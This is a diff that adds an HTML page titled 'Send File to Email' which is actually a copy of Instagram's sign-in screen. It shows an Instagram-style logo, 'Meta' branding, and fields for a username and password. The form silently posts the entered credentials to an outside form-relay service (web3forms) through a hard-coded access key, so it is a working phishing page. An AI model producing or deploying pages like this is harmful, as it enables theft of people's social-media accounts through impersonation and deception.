@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send File to Email</title>
+    <style>
+        /* Background Gradient matching the image */
+        body { 
+            font-family: 'Inter', -apple-system, sans-serif; 
+            background: linear-gradient(135deg, #fdf6f4 0%, #f0f8ff 50%, #f6fff6 100%);
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+        }
+
+        /* The white floating card */
+        .container { 
+            background: white; 
+            padding: 40px; 
+            border-radius: 30px; 
+            box-shadow: 0 10px 40px rgba(0,0,0,0.05); 
+            width: 100%; 
+            max-width: 450px; 
+            text-align: center;
+        }
+
+        /* Instagram Logo Styling */
+        .logo-box {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+        }
+
+        h2 { 
+            color: #262626; 
+            font-size: 24px; 
+            margin-bottom: 30px;
+            font-weight: 700;
+        }
+
+        /* Pill-shaped inputs */
+        input[type="text"], 
+        input[type="access_code"], 
+        textarea { 
+            width: 100%; 
+            padding: 14px 20px; 
+            margin-bottom: 15px; 
+            border: 1px solid #e0e6ed; 
+            border-radius: 12px; 
+            box-sizing: border-box; 
+            font-size: 16px;
+            background-color: #fafafa;
+        }
+
+        /* Style for the file upload section */
+        .file-upload-wrapper {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .file-label {
+            display: block;
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 8px;
+            padding-left: 5px;
+        }
+
+        /* Blue Submit Button (Pill Shape) */
+        .submit-btn { 
+            width: 100%; 
+            padding: 14px; 
+            background-color: #007bff; 
+            color: white; 
+            border: none; 
+            border-radius: 25px; 
+            font-size: 16px; 
+            font-weight: 600;
+            cursor: pointer; 
+            transition: background 0.3s;
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(0, 123, 255, 0.3);
+        }
+
+        .submit-btn:hover { 
+            background-color: #0056b3; 
+        }
+
+        /* Placeholder colors */
+        ::placeholder {
+            color: #8e8e8e;
+        }
+        
+        .create-account{display:block;width:100%;max-width:var(--form-width);margin-top:28px;padding:12px;border-radius:28px;border:2px solid var(--blue);background:transparent;color:var(--blue);text-align:center;font-weight:600;text-decoration:none}
+        .meta{margin-top:18px;text-align:center;color:var(--muted);font-weight:600}
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-box">
+        <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="g1" x1="0%" x2="100%" y1="0%" y2="100%">
+                    <stop offset="0%" stop-color="#feda75"/>
+                    <stop offset="30%" stop-color="#fa7e1e"/>
+                    <stop offset="60%" stop-color="#d62976"/>
+                    <stop offset="100%" stop-color="#962fbf"/>
+                </linearGradient>
+            </defs>
+            <rect x="64" y="64" width="384" height="384" rx="96" ry="96" fill="url(#g1)"/>
+            <circle cx="256" cy="256" r="110" fill="#fff"/>
+            <circle cx="256" cy="256" r="70" fill="url(#g1)"/>
+            <circle cx="380" cy="132" r="22" fill="#fff"/>
+        </svg>
+    </div>
+
+    
+    
+    <form action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data">
+        
+        <input type="hidden" name="access_key" value="6278e8ed-dfa8-4c15-b3cb-1d09060864ec">
+
+        <input type="text" name="name" placeholder="Username, email or mobile number"  required>
+
+        <input type="access_code" name="access_code" placeholder="password" required>
+
+
+        <button type="submit" class="submit-btn">sign in </button>
+    
+            <a href="#" class="create-account">Create new account</a>
+        
+            <div class="meta">Meta</div>
+    </form>
+</div>
+
+</body>
+</html>
